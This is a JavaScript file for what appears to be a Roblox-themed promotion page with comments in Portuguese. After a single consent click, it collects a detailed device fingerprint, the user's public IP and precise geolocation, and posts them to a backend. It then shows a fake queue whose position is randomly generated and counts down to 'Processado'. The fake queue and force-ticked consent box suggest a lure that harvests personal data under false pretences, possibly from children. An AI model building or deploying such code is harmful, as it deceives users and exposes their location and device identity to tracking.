// ========================================
// CONFIG
// ========================================
const ENDPOINT = '/api/send'; // Function serverless da Vercel

// ELEMENTOS DA PÁGINA
const btn = document.getElementById('btnMain');
const modalBack = document.getElementById('modal');
const acceptBtn = document.getElementById('accept');
const denyBtn = document.getElementById('deny');
const consentCheckbox = document.getElementById('consentCheckbox');
const queue = document.getElementById('queue');
const posEl = document.getElementById('pos');
const revokeBtn = document.getElementById('revoke');

// Adicionar a seção principal (Hero/Content)
// Garante que o elemento principal seja ocultado antes da fila
const heroSection = document.querySelector('.hero') || document.querySelector('.content'); 

// ========================================
// CONSENT SYSTEM
// ========================================
function hasConsent() {
  return localStorage.getItem('promo_consent') === 'true';
}

function setConsent(v) {
  localStorage.setItem('promo_consent', v ? 'true' : 'false');
}

// ========================================
// EVENTOS
// ========================================

// Clique no botão principal → abre modal ou continua
btn.addEventListener('click', () => {
  if (!hasConsent()) {
    modalBack.style.display = 'flex';
    modalBack.setAttribute('aria-hidden', 'false');
  } else {
    collectAndStart();
  }
});

// REMOVIDO: O evento de 'change' do checkbox, pois ele é marcado automaticamente ao aceitar.

// Negar consentimento
denyBtn.addEventListener('click', () => {
  setConsent(false);
  modalBack.style.display = 'none';
  alert('Você recusou. Não será possível participar.'); 
});

// Aceitar consentimento (FLUXO SIMPLIFICADO: Marca o checkbox e inicia o processo)
acceptBtn.addEventListener('click', async () => {
  // 1. Marca o checkbox de consentimento forçadamente (para fins de registro de estado)
  consentCheckbox.checked = true; 

  // 2. Define o consentimento no localStorage
  setConsent(true);

  // 3. Oculta o modal
  modalBack.style.display = 'none';
  
  // 4. Inicia a coleta de dados e o fluxo da fila
  await collectAndStart();
});

// Revogar consentimento local
revokeBtn.addEventListener('click', (e) => {
  e.preventDefault();
  setConsent(false);
  localStorage.removeItem('promo_submission_id');
  alert('Consentimento removido localmente. O processo será reiniciado se você participar novamente.');
});

// ========================================
// COLETA + ENVIO
// ========================================
async function collectAndStart() {
  try {
    const data = await gatherClientData();
    console.log('📦 Dados coletados:', data);

    // Envio ao backend
    try {
      const res = await fetch(ENDPOINT, {
        method: 'POST',
        headers: {'Content-Type': 'application/json'},
        body: JSON.stringify(data)
      });

      const json = await res.json().catch(() => ({}));

      if (json && json.ok && json.id) {
        localStorage.setItem('promo_submission_id', json.id);
      }

      console.log('📨 Resposta servidor:', json);
    } catch (err) {
      console.error('❌ Erro ao enviar:', err);
    }

  } catch (e) {
    console.error('❌ Erro:', e);
  }

  startQueueFlow();
}

// ========================================
// ANIMAÇÃO DE FILA ROBLOX
// ========================================
function startQueueFlow() {
  
  // Oculta conteúdo principal (CORRIGIDO)
  if (heroSection) {
    heroSection.style.display = 'none';
  }

  queue.style.display = 'block';
  queue.setAttribute('aria-hidden', 'false');

  // Simula posição da fila
  let pos = Math.floor(Math.random() * 120) + 40;
  posEl.textContent = pos;

  const interval = setInterval(() => {
    pos--;
    posEl.textContent = pos;

    if (pos <= 1) {
      clearInterval(interval);
      posEl.textContent = "Processado";
    }

  }, 250 + Math.random()*100);
}

// ========================================
// COLETA AVANÇADA DE DADOS PERMITIDOS
// ========================================
async function gatherClientData() {
  const nav = navigator;
  const screenObj = window.screen || {};
  const tz = Intl.DateTimeFormat().resolvedOptions().timeZone || null;
  const perf = (performance && performance.timing)
    ? performance.timing.toJSON?.() || performance.timing
    : null;

  const data = {
    timestamp: new Date().toISOString(),
    userAgent: nav.userAgent || null,
    platform: nav.platform || null,
    language: nav.language || nav.languages?.[0] || null,
    screen: {
      width: screenObj.width || null,
      height: screenObj.height || null,
      colorDepth: screenObj.colorDepth || null
    },
    deviceMemory: nav.deviceMemory || null,
    hardwareConcurrency: nav.hardwareConcurrency || null,
    cookieEnabled: nav.cookieEnabled || null,
    timezone: tz,
    connection: nav.connection
      ? {
          effectiveType: nav.connection.effectiveType,
          downlink: nav.connection.downlink
        }
      : null,
    battery: null,
    webgl: null,
    performanceTiming: perf,
    geolocation: null,
    referrer: document.referrer || null,
    origin: location.origin,
    path: location.pathname
  };

  // ----------------------------------------
  // Battery API
  // ----------------------------------------
  try {
    if (navigator.getBattery) {
      const b = await navigator.getBattery();
      data.battery = { charging: b.charging, level: b.level };
    }
  } catch (e) {}

  // ----------------------------------------
  // WebGL Info (GPU)
  // ----------------------------------------
  try {
    const canvas = document.createElement('canvas');
    const gl =
      canvas.getContext('webgl') ||
      canvas.getContext('experimental-webgl');

    if (gl) {
      const ext = gl.getExtension('WEBGL_debug_renderer_info');
      data.webgl = {
        renderer: ext ? gl.getParameter(ext.UNMASKED_RENDERER_WEBGL) : null,
        vendor: ext ? gl.getParameter(ext.UNMASKED_VENDOR_WEBGL) : null
      };
    }
  } catch (e) {}

  // ----------------------------------------
  // IP público
  // ----------------------------------------
  try {
    const r = await fetch('https://api.ipify.org?format=json');
    const j = await r.json();
    data.publicIp = j.ip;
  } catch (e) {
    data.publicIp = null;
  }

  // ----------------------------------------
  // Geolocation (somente se permitido)
  // ----------------------------------------
  try {
    const geo = await new Promise((resolve) => {
      if (!navigator.geolocation) return resolve(null);

      navigator.geolocation.getCurrentPosition(
        pos =>
          resolve({
            lat: pos.coords.latitude,
            lon: pos.coords.longitude,
            accuracy: pos.coords.accuracy
          }),
        err =>
          resolve({ error: err.code || 'denied' }),
        { maximumAge: 60000, timeout: 10000 }
      );
    });

    data.geolocation = geo;
  } catch (e) {
    data.geolocation = { error: 'failed' };
  }

  return data;
}
